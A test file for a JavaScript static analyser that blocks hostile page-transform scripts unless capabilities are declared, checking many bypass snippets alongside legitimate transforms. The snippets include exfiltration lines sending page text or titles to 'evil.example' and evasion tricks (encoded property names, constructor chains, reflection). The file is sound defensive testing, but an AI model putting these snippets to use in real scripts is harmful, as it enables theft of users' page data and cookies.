import { describe, expect, it } from 'vitest'
import type { Capability } from '@shared/types'
import { wrapTransform } from '../background/harness'
import { analyseJavaScript, applyCapabilityPolicy } from './static-analysis'

const findingApis = (source: string) =>
  analyseJavaScript(source).findings.map((f) => f.api)

/**
 * Runs the same two steps the background gate runs and reports whether any
 * finding blocks saving. Using the real policy step matters: a warning with no
 * capability attached is not raised by it, which is how #49 passed unnoticed.
 */
const blocks = (source: string, declared: Capability[] = []) => {
  const { findings } = applyCapabilityPolicy(analyseJavaScript(source), declared)
  return findings.some((f) => f.severity === 'block')
}

describe('analyseJavaScript', () => {
  it('passes an ordinary DOM transform with no findings', () => {
    const result = analyseJavaScript(`
      const sidebar = document.querySelector('aside[role="complementary"]');
      if (sidebar && !sidebar.dataset.waHidden) {
        sidebar.dataset.waHidden = '1';
        sidebar.style.display = 'none';
      }
    `)
    expect(result.findings).toEqual([])
    expect(result.usedCapabilities).toEqual([])
  })

  it('detects each network egress API', () => {
    expect(findingApis(`fetch('/x')`)).toContain('fetch')
    expect(findingApis(`new XMLHttpRequest()`)).toContain('XMLHttpRequest')
    expect(findingApis(`new WebSocket('wss://x')`)).toContain('WebSocket')
    expect(findingApis(`new EventSource('/x')`)).toContain('EventSource')
    expect(findingApis(`navigator.sendBeacon('/x', d)`)).toContain('navigator.sendBeacon')
    expect(findingApis(`import('./x.js')`)).toContain('import()')
  })

  it('treats window.fetch and globalThis.fetch as the same API', () => {
    expect(findingApis(`window.fetch('/x')`)).toContain('fetch')
    expect(findingApis(`globalThis.fetch('/x')`)).toContain('fetch')
  })

  it('detects credential and storage reads', () => {
    expect(findingApis(`const c = document.cookie`)).toContain('document.cookie')
    expect(findingApis(`localStorage.getItem('t')`)).toContain('localStorage')
    expect(findingApis(`sessionStorage.setItem('a','b')`)).toContain('sessionStorage')
    expect(findingApis(`indexedDB.open('db')`)).toContain('indexedDB')
  })

  it('blocks code-from-string constructs outright', () => {
    for (const source of [
      `eval('alert(1)')`,
      `new Function('return 1')()`,
      `setTimeout("doThing()", 100)`,
      "setInterval(`tick()`, 100)",
    ]) {
      const { findings } = analyseJavaScript(source)
      expect(
        findings.some((f) => f.severity === 'block'),
        `expected a blocking finding for: ${source}`,
      ).toBe(true)
    }
  })

  it('does not flag identifiers that appear inside strings or comments', () => {
    // The whole reason this uses a parser rather than a regex.
    const result = analyseJavaScript(`
      // we deliberately do not call fetch here
      const message = "do not use document.cookie";
      const element = document.body;
      element.textContent = message;
    `)
    expect(result.findings).toEqual([])
  })

  it('flags dynamic property access as unanalysable rather than clean', () => {
    const apis = findingApis(`window[atob('ZmV0Y2g=')]('/x')`)
    expect(apis).toContain('(dynamic property access)')
  })

  it('resolves a key made only of literals, so it is judged by its real name', () => {
    expect(findingApis(`window['fet' + 'ch']('/x')`)).toContain('fetch')
  })

  it('blocks saving when a computed property cannot be resolved (#49)', () => {
    for (const source of [
      `globalThis['fe' + 'tch']('https://evil.example/?c=' + encodeURIComponent(document.body.innerText))`,
      `const c = document['cookie']`,
      `const X = window[atob('WE1MSHR0cFJlcXVlc3Q=')]`,
    ]) {
      expect(blocks(source), `expected a block for: ${source}`).toBe(true)
    }
  })

  it('does not block a computed property that is a plain index', () => {
    // Control: the rule must not simply block every bracket access.
    expect(blocks(`const items = [1], rows = [2]; const first = items[0]; const el = rows[2];`)).toBe(false)
  })

  it('treats numeric indexing as ordinary, not obfuscation', () => {
    const result = analyseJavaScript(`const items = [1], rows = [2]; const first = items[0]; const el = rows[2];`)
    expect(result.findings).toEqual([])
  })

  it('reports unparseable source as blocking rather than clean', () => {
    const result = analyseJavaScript(`function ( {{{`)
    expect(result.parseError).toBeDefined()
    expect(result.findings[0]?.severity).toBe('block')
  })
})

describe('dynamic import (#137)', () => {
  const source = `import('https://evil.example/payload.js')`

  it('blocks import() whether or not network is declared', () => {
    expect(blocks(source, [])).toBe(true)
    expect(blocks(source, ['network'])).toBe(true)
  })

  it('still lets a plain fetch through once network is declared', () => {
    // Control: declaring network must keep unlocking requests, otherwise the
    // test above could pass because everything blocks.
    expect(blocks(`fetch('https://example.com/collect')`, ['network'])).toBe(false)
    expect(blocks(`fetch('https://example.com/collect')`, [])).toBe(true)
  })
})

describe('applyCapabilityPolicy', () => {
  it('raises undeclared capability use from warn to block', () => {
    const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, [])

    expect(undeclared).toEqual(['network'])
    expect(findings.find((f) => f.api === 'fetch')?.severity).toBe('block')
  })

  it('leaves declared capability use as a warning', () => {
    const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, ['network'])

    expect(undeclared).toEqual([])
    expect(findings.find((f) => f.api === 'fetch')?.severity).toBe('warn')
  })

  it('blocks only the undeclared capability when several are used', () => {
    const outcome = analyseJavaScript(`
      const c = document.cookie;
      localStorage.setItem('x', c);
    `)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, ['storage'])

    expect(undeclared).toEqual(['cookies'])
    expect(findings.find((f) => f.api === 'document.cookie')?.severity).toBe('block')
    expect(findings.find((f) => f.api === 'localStorage')?.severity).toBe('warn')
  })
})

/**
 * Every snippet from #48, plus variants of each technique. All run with no
 * capabilities declared, as in the issue.
 */
const BYPASSES: Record<string, string[]> = {
  'aliases of document and navigator': [
    `const n = navigator; n.sendBeacon('https://evil.example', document.body.innerText)`,
    `top.navigator.sendBeacon('https://evil.example', 'x')`,
    `const d = document; const c = d.cookie`,
    `const { cookie } = document`,
    `this.document.cookie`,
    `const w = window; w.fetch('https://evil.example')`,
    `const g = globalThis; g.fetch('https://evil.example')`,
    `self.fetch('https://evil.example')`,
    `parent.document.cookie`,
    `frames[0].document.cookie`,
    `(function (document) { return document.cookie })(globalThis.document)`,
    `document.body.ownerDocument.cookie`,
    `document.body.getRootNode().cookie`,
    `const f = fetch; f('https://evil.example')`,
  ],
  'reflection and property descriptors': [
    `Object.getOwnPropertyDescriptor(Document.prototype, 'coo' + 'kie').get.call(document)`,
    `Object.getOwnPropertyDescriptor(Document.prototype, 'cookie').get.call(document)`,
    `Reflect.get(globalThis, 'fe' + 'tch')('https://evil.example/x')`,
    `Reflect.get(window, 'local' + 'Storage').getItem('token')`,
    `Reflect.apply(fetch, null, ['https://evil.example'])`,
    `new Proxy({}, {})`,
    `const { constructor: C } = []; C.constructor('return 1')()`,
    `document.__lookupGetter__('cookie').call(document)`,
  ],
  'constructor chains': [
    `[].constructor.constructor('return 1')()`,
    `(async () => {}).constructor('return 1')()`,
    `(() => {})['constructor']('return 1')()`,
    `Object.getPrototypeOf(async function () {}).constructor('return 1')()`,
  ],
  'storage and cookie stores': [
    `cookieStore.getAll()`,
    `localStorage.getItem('token')`,
    `window.sessionStorage.getItem('token')`,
    `indexedDB.open('db')`,
  ],
  'string timers and code from strings': [
    `const s = 'void 0'; setTimeout(s)`,
    `setTimeout('void ' + '0')`,
    `setInterval(String('void 0'), 10)`,
    `window.setTimeout('void 0')`,
    `eval('1')`,
    `new Function('return 1')()`,
    `import('https://evil.example/x.js')`,
  ],
  'navigation and messaging': [
    `location.href = 'https://evil.example/?d=' + encodeURIComponent(document.body.innerText)`,
    `window.open('https://evil.example/?d=' + encodeURIComponent(document.title))`,
    `window.postMessage('x', '*')`,
    `postMessage('x', '*')`,
    `document.location = 'https://evil.example'`,
    `history.pushState(null, '', '/x')`,
  ],
  'elements that load or run things': [
    `const s2 = document.createElement('script'); s2.textContent = 'window.x = 1'; document.head.append(s2)`,
    `document.body.append(document.createElement('iframe'))`,
    `document.body.append(document.createElement('img'))`,
    `document.body.append(document.createElement('link'))`,
    `document.body.append(document.createElement('form'))`,
    `document.body.append(document.createElement('object'))`,
    `document.body.append(document.createElement('embed'))`,
    `document.body.append(document.createElement('audio'))`,
    `document.body.append(document.createElement('video'))`,
    `document.body.append(document.createElement('source'))`,
    `document.body.append(document.createElement('base'))`,
    `const t = 'scr' + 'ipt'; document.createElement(t)`,
    `new Image().src = 'https://evil.example/x.gif?' + document.title`,
    `new Audio('https://evil.example/x.mp3')`,
    `const c = document.createElement; c.call(document, 'script')`,
  ],
  'HTML-string and URL sinks': [
    `document.body.insertAdjacentHTML('beforeend', '<img src=x onerror="window.x=1">')`,
    `document.body.innerHTML = '<b>x</b>'`,
    `document.body.innerHTML += '<b>x</b>'`,
    `el.outerHTML = '<b>x</b>'`,
    `document.write('<b>x</b>')`,
    `el.srcdoc = '<script>1</script>'`,
    `el.src = 'https://evil.example/x'`,
    `a.href = 'javascript:void 0'`,
    `form.action = 'https://evil.example'`,
    `form.submit()`,
    `el.setAttribute('src', 'https://evil.example/x')`,
    `el.setAttribute('href', 'https://evil.example/x')`,
    `el.setAttribute('onclick', 'window.x = 1')`,
    `el.setAttribute(name, value)`,
    `el.style.backgroundImage = 'url(https://evil.example/x.gif)'`,
    `el.style.cssText = 'background: url(https://evil.example/x.gif)'`,
    `el.style.setProperty('background-image', 'url(https://evil.example/x.gif)')`,
    `el.style.backgroundImage = 'ur' + 'l(' + x + ')'`,
    `Object.assign(el, { src: 'https://evil.example/x' })`,
    `const { src } = el; ({ src: el.src } = other)`,
    `el.textContent = '@imp' + 'ort "https://evil.example/x.css"'`,
    `el.textContent = '@import url(https://evil.example/x.css)'`,
    `const r = document.createRange(); r.createContextualFragment('<img src=x>')`,
    `el.style.setProperty('--u', 'ur' + 'l(https://evil.example/x)'); el.style.background = 'var(--u)'`,
    `el.style.setProperty('--u', x); el.style.background = 'var(--u)'`,
    `el.style.background = 'var(--u)'`,
    `document.querySelector('meta').setAttribute('http-equiv', 'refresh')`,
    `document.querySelectorAll('div style').length`,
    `document.getElementsByTagName('style')[0]`,
    `el.sheet.insertRule('@import "https://evil.example/x.css"')`,
    `document.createElement('style')`,
    `new DOMParser().parseFromString('<img src=x>', 'text/html')`,
  ],
  'workers and blob URLs': [
    `new Worker('worker.js')`,
    `new Worker(URL.createObjectURL(new Blob(['1'])))`,
    `new SharedWorker('x.js')`,
    `navigator.serviceWorker.register('x.js')`,
  ],
  'network APIs through other routes': [
    `fetch('https://evil.example')`,
    `navigator.sendBeacon('https://evil.example', 'x')`,
    `new WebSocket('wss://evil.example')`,
    `new EventSource('https://evil.example')`,
    `new XMLHttpRequest()`,
    `new BroadcastChannel('x')`,
  ],
  'unresolvable access': [
    `globalThis['fe' + 'tch']('https://evil.example')`,
    `const k = 'cookie'; document[k]`,
    `const obj = {}; obj[someName]`,
    `with (document) { cookie }`,
  ],
}

/** Realistic transforms, written in the shapes the generation prompt asks for. */
const LEGITIMATE: Record<string, string> = {
  'hide an element once, guarded by a marker': `
    const sidebar = document.querySelector('aside[role="complementary"]');
    if (sidebar && !sidebar.dataset.waHidden) {
      sidebar.dataset.waHidden = '1';
      sidebar.style.display = 'none';
    }`,
  'hide every element of a set': `
    document.querySelectorAll('[data-ad], .promo-banner').forEach((el) => {
      if (el.dataset.waHidden) return;
      el.dataset.waHidden = '1';
      el.style.setProperty('display', 'none', 'important');
    });`,
  'toggle classes and attributes': `
    const nav = document.querySelector('nav[aria-label="Main"]');
    if (nav && !nav.classList.contains('wa-compact')) {
      nav.classList.add('wa-compact');
      nav.setAttribute('aria-expanded', 'false');
      nav.setAttribute('data-wa', 'compact');
      nav.removeAttribute('hidden');
    }`,
  'rewrite visible text': `
    for (const el of document.querySelectorAll('h2.title')) {
      const text = el.textContent.trim();
      if (!text.startsWith('[')) el.textContent = '[' + text + ']';
    }`,
  'insert a button with a click listener, once': `
    const header = document.querySelector('header');
    if (header && !header.querySelector('.wa-top')) {
      const button = document.createElement('button');
      button.className = 'wa-top';
      button.type = 'button';
      button.textContent = 'Top';
      button.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
      header.append(button);
    }`,
  'reorder list items with an indexed loop': `
    const list = document.querySelector('ul.results');
    if (list && !list.dataset.waSorted) {
      list.dataset.waSorted = '1';
      const items = Array.from(list.children);
      items.sort((a, b) => a.textContent.localeCompare(b.textContent));
      for (let i = 0; i < items.length; i++) list.appendChild(items[i]);
      const last = items[items.length - 1];
      if (last) last.classList.add('wa-last');
    }`,
  'read computed style and set sizes': `
    const card = document.querySelector('article');
    if (card && !card.dataset.waSized) {
      card.dataset.waSized = '1';
      const style = getComputedStyle(card);
      const width = parseFloat(style.width);
      card.style.maxWidth = Math.min(width, 720) + 'px';
      card.style.fontSize = '18px';
      card.style.color = 'inherit';
    }`,
  'wrap an element in a new container': `
    const video = document.querySelector('main video');
    if (video && !video.parentElement.classList.contains('wa-wrap')) {
      const wrap = document.createElement('div');
      wrap.classList.add('wa-wrap');
      video.parentElement.insertBefore(wrap, video);
      wrap.appendChild(video);
    }`,
  'build content with text nodes and a template of spans': `
    const row = document.querySelector('.row');
    if (row && !row.querySelector('.wa-count')) {
      const span = document.createElement('span');
      span.className = 'wa-count';
      span.append(document.createTextNode(String(row.children.length) + ' items'));
      row.prepend(span);
    }`,
  'observe changes and delay work': `
    const target = document.querySelector('main');
    const trim = () => {
      for (const el of document.querySelectorAll('.promoted')) el.remove();
    };
    if (target) {
      new MutationObserver(() => requestAnimationFrame(trim)).observe(target, { childList: true });
      setTimeout(trim, 500);
    }`,
  'keyboard shortcut on the document': `
    if (!document.body.dataset.waKeys) {
      document.body.dataset.waKeys = '1';
      document.addEventListener('keydown', (event) => {
        if (event.key === 'j') document.querySelector('.next')?.click();
      });
    }`,
  'read a link address without changing it': `
    const links = Array.from(document.querySelectorAll('a[href]'));
    const external = links.filter((a) => a.href.startsWith('http') && !a.dataset.waSeen);
    for (const a of external) { a.dataset.waSeen = '1'; a.title = a.hostname; }`,
  'wait with a promise, then act': `
    (async () => {
      await new Promise((resolve) => setTimeout(resolve, 200));
      const panel = document.querySelector('[role="dialog"]');
      if (panel) panel.hidden = true;
    })();`,
  'open a details element and set colours from variables': `
    for (const d of document.querySelectorAll('details:not([open])')) d.open = true;
    const colour = getComputedStyle(document.body).color;
    const bar = document.querySelector('.bar');
    if (bar) { bar.style.backgroundColor = colour; bar.style.cursor = colour ? 'pointer' : 'default'; }
    document.querySelectorAll('div[style*="width"]').forEach((n) => n.style.removeProperty('width'));`,
  'assign styles from an object literal': `
    const bar = document.querySelector('.bar');
    if (bar) Object.assign(bar.style, { position: 'sticky', top: '0px', zIndex: '10' });`,
}

/**
 * Declares the names the bypass snippets use freely, so that a snippet blocks
 * because of the technique it demonstrates and not because it mentions an
 * undeclared variable. The preamble itself must pass; see the control below.
 */
const PREAMBLE =
  `const el = document.querySelector('x'); const a = el, form = el, other = el; ` +
  `const name = 'x', value = 'y', x = 'z', someName = 'k';\n`

describe('allowlist (#48): bypasses are blocked', () => {
  it('control: the preamble alone passes, so it hides no reason to block', () => {
    expect(blocks(PREAMBLE)).toBe(false)
    expect(blocks(PREAMBLE + `el.textContent = name + value;`)).toBe(false)
  })

  for (const [group, snippets] of Object.entries(BYPASSES)) {
    for (const snippet of snippets) {
      it(`${group}: ${snippet}`, () => {
        expect(blocks(PREAMBLE + snippet)).toBe(true)
      })
    }
  }

  it('lets a declared capability unlock only what it names', () => {
    expect(blocks(`fetch('/x')`, ['network'])).toBe(false)
    expect(blocks(`localStorage.getItem('a')`, ['storage'])).toBe(false)
    expect(blocks(`const c = document.cookie`, ['cookies'])).toBe(false)
    // A declared capability does not unlock aliasing or reflection.
    expect(blocks(`const d = document; d.cookie`, ['cookies'])).toBe(true)
    expect(blocks(`Reflect.get(globalThis, 'fetch')('/x')`, ['network'])).toBe(true)
    expect(blocks(`localStorage.getItem('a')`, ['network'])).toBe(true)
  })
})

describe('allowlist (#48): legitimate transforms still pass', () => {
  for (const [name, code] of Object.entries(LEGITIMATE)) {
    it(`passes: ${name}`, () => {
      const { findings } = applyCapabilityPolicy(analyseJavaScript(code), [])
      expect(findings, JSON.stringify(findings)).toEqual([])
    })

    it(`passes inside the harness: ${name}`, () => {
      const wrapped = wrapTransform({
        name: 'test',
        anchor: { landmarks: ['main', '[role="main"]'] },
        code,
      } as unknown as Parameters<typeof wrapTransform>[0])
      expect(blocks(wrapped)).toBe(false)
    })
  }

  it('does not pass because the analyser blocks everything', () => {
    // Control for the two groups above: the same helper must report both
    // outcomes, and a legitimate snippet must differ from a hostile one only
    // in the thing that is hostile.
    expect(blocks(`document.querySelector('a').textContent = 'x'`)).toBe(false)
    expect(blocks(`document.querySelector('a').innerHTML = 'x'`)).toBe(true)
  })
})

/**
 * Gaps found by the audit of 00cc5f7 (#48). Each snippet is the one the
 * auditor reported, run through the analyser and the capability policy with
 * no capability declared unless the test says otherwise.
 */
describe('audit of 00cc5f7 (#48): logical assignment', () => {
  const SNIPPETS = [
    `let k = 0; k ||= 'constructor'; [][k][k]('return 1')()`,
    `let k; k ??= 'constructor'; [][k][k]('return 1')()`,
    `let k = 1; k &&= 'constructor'; [][k][k]('return 1')()`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks a logical assignment of text to a custom style property', () => {
    expect(blocks(`const el = document.body; let v = 1; v ||= el.textContent; el.style.setProperty('--u', v)`)).toBe(true)
    expect(blocks(`const el = document.body; el.style['--u'] ||= el.textContent`)).toBe(true)
    expect(blocks(`const el = document.body; el.style['--u'] += 'l(https://evil.example/)'`)).toBe(true)
  })

  it('controls: a logical assignment of a number still counts as numeric', () => {
    expect(blocks(`let k = 0; k ||= 2; const a = [1, 2, 3]; a[k]`)).toBe(false)
    expect(blocks(`let k; k ??= 1; const a = [1, 2, 3]; a[k]`)).toBe(false)
    expect(blocks(`let k = 3; k -= 1; k *= 2; const a = [1, 2, 3]; a[k]`)).toBe(false)
    expect(blocks(`let k = 0; k += 1; const a = [1, 2]; a[k]`)).toBe(false)
    expect(blocks(`const el = document.body; let n = 1; n ||= 2; el.style.setProperty('--n', n)`)).toBe(false)
  })
})

describe('audit of 00cc5f7 (#48): routes to the window and document values', () => {
  const SNIPPETS = [
    `setTimeout(function () { const w = this; const o = w.open; o.call(w, 'https://evil.example/?' + document.title) }, 0)`,
    `window.addEventListener('focus', (e) => { const w = e.target; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() })`,
    `setTimeout(function () { new this.AudioContext().audioWorklet.addModule('https://evil.example/x.js') }, 0)`,
    `setTimeout(function () { const f = Object.entries(this).find(([n]) => n === 'fe' + 'tch')[1]; f('https://evil.example') }, 0)`,
    `window.addEventListener('focus', (e) => { e.target.navigator.clipboard.readText().then((t) => document.title = t) })`,
    `const d = document.documentElement.parentNode; const { open } = d; open.call(d, 'https://evil.example/?' + document.title, '', '')`,
    `const d = document.body.getRootNode(); const o = d.open; o.call(d, 'https://evil.example/', 'x', '')`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks this in a function that is not a class or object method', () => {
    for (const source of [
      `setInterval(function tick() { const w = this }, 10)`,
      `function f() { return this } setTimeout(f, 0)`,
      `const f = function () { return this }; f()`,
      `(function () { return this })()`,
      `window.addEventListener('x', function () { this.open('https://evil.example') })`,
      `const o = { handler: function () { return this } }`,
      `class A { handler = function () { return this } }`,
      `[1].forEach(function () { const w = this })`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('blocks a method that can be handed to a window or document listener', () => {
    // A listener function is called with this set to the object it is on, so
    // a method passed there would receive the window.
    expect(blocks(`const o = { f() { return this } }; window.addEventListener('x', o.f)`)).toBe(true)
    expect(blocks(`class A { f() { return this } } document.addEventListener('x', new A().f)`)).toBe(true)
    expect(blocks(`document.addEventListener('x', { handleEvent(e) { return e } })`)).toBe(true)
    expect(blocks(`const h = () => 1; window.addEventListener('x', h)`)).toBe(true)
  })

  it('blocks every route from a window or document listener to its event target', () => {
    for (const name of ['target', 'currentTarget', 'srcElement', 'originalTarget', 'explicitOriginalTarget', 'view']) {
      expect(blocks(`document.addEventListener('x', (e) => { const t = e.${name}; })`), name).toBe(true)
      expect(blocks(`window.addEventListener('x', function (e) { return e.${name} })`), name).toBe(true)
    }
    for (const source of [
      `document.addEventListener('x', (e) => { const { target } = e })`,
      `document.addEventListener('x', ({ target }) => target)`,
      `document.addEventListener('x', (e) => { const f = e; f.target })`,
      `document.addEventListener('x', (e) => { helper(e) }); function helper(ev) { return ev.key }`,
      `document.addEventListener('x', (...args) => args[0])`,
      `document.addEventListener('x', function () { return arguments[0] })`,
      `window.addEventListener('x', (e) => { document.body.addEventListener('y', () => e.currentTarget) })`,
      `window.addEventListener('x', (e) => e.composedPath())`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('blocks getRootNode, and parentNode unless the result is used at once', () => {
    for (const source of [
      `document.body.getRootNode()`,
      `document.body.getRootNode({ composed: true }).title`,
      `const p = document.body.parentNode; p.title`,
      `document.documentElement.parentNode.parentNode`,
      `let n = document.body; while (n.parentNode) n = n.parentNode`,
      `const { parentNode } = document.body`,
      `document.createTreeWalker(document.body).parentNode()`,
      `document.body.parentNode.open('https://evil.example')`,
      `document.body.parentNode.defaultView`,
      `document.getSelection().anchorNode`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('blocks Object.entries, values, keys and getOwnPropertyNames on values that are not written out', () => {
    for (const method of ['entries', 'values', 'keys', 'getOwnPropertyNames']) {
      expect(blocks(`Object.${method}(document.body)`), method).toBe(true)
      expect(blocks(`Object.${method}(document.body.dataset)`), method).toBe(true)
      expect(blocks(`let o = { a: 1 }; o = document.body; Object.${method}(o)`), method).toBe(true)
      expect(blocks(`Object.${method}({ ...document.body.dataset })`), method).toBe(true)
      expect(blocks(`const f = Object.${method}; f({})`), method).toBe(true)
      expect(blocks(`const O = Object; O.${method}({})`), method).toBe(true)
      expect(blocks(`const { ${method} } = Object`), method).toBe(true)
    }
    // An alias of Object would also skip the Object.assign check.
    expect(blocks(`const O = Object; O.assign(document.body, { src: 'x' })`)).toBe(true)
  })

  it('blocks reading or destructuring open, but not setting it', () => {
    expect(blocks(`const d = document.querySelector('details'); const o = d.open`)).toBe(true)
    expect(blocks(`const { open } = document.querySelector('details')`)).toBe(true)
    expect(blocks(`const d = document.querySelector('details'); d.open = !d.open`)).toBe(true)
    expect(blocks(`const d = document.querySelector('details'); d.open ||= true`)).toBe(true)
    expect(blocks(`const d = document.querySelector('details'); [d.open] = [true]`)).toBe(true)
  })

  it('controls: the ordinary forms of the same code still pass', () => {
    for (const source of [
      `class A { n = 1; bump() { this.n++; return this.n } } new A().bump()`,
      `class A { n = 1; static s = 2; static { this.s = 3 } } new A()`,
      `const o = { n: 1, bump() { this.n++ }, get double() { return this.n * 2 } }; o.bump()`,
      `class A { run() { setTimeout(() => { this.n = 1 }, 10) } } new A().run()`,
      `window.addEventListener('resize', () => { document.body.dataset.w = String(window.innerWidth) })`,
      `document.addEventListener('keydown', (e) => { if (e.key === 'j') e.preventDefault() })`,
      `window.addEventListener('scroll', function (event) { return event.type })`,
      `const b = document.createElement('button'); b.addEventListener('click', (e) => e.target.closest('a'))`,
      `const b = document.body; b.addEventListener('click', function (e) { return e.currentTarget.id })`,
      `const el = document.body.firstElementChild; el.parentNode.removeChild(el)`,
      `const el = document.body.firstElementChild; el.parentNode.insertBefore(document.createElement('div'), el)`,
      `const el = document.body.firstElementChild; el.parentNode.appendChild(el)`,
      `const el = document.body.firstElementChild; const p = el.parentElement; p.classList.add('x')`,
      `const e = Object.entries({ a: 1, b: 2 }); e.length`,
      `const colours = { a: 'red', b: 'blue' }; Object.keys(colours).length; Object.values(colours)`,
      `const keys = Object.getOwnPropertyNames(['x']); keys.length`,
      `const o = Object.assign({}, { a: 1 }); o instanceof Object; Object(1); new Object()`,
      `const m = new Map([['a', 1]]); for (const k of m.keys()) k; for (const v of m.values()) v; m.entries()`,
      `const d = document.querySelector('details'); if (d) d.open = true`,
      `const d = document.querySelector('details'); if (d) d.setAttribute('open', '')`,
      `document.querySelectorAll('details:not([open])').forEach((d) => d.toggleAttribute('data-wa'))`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})
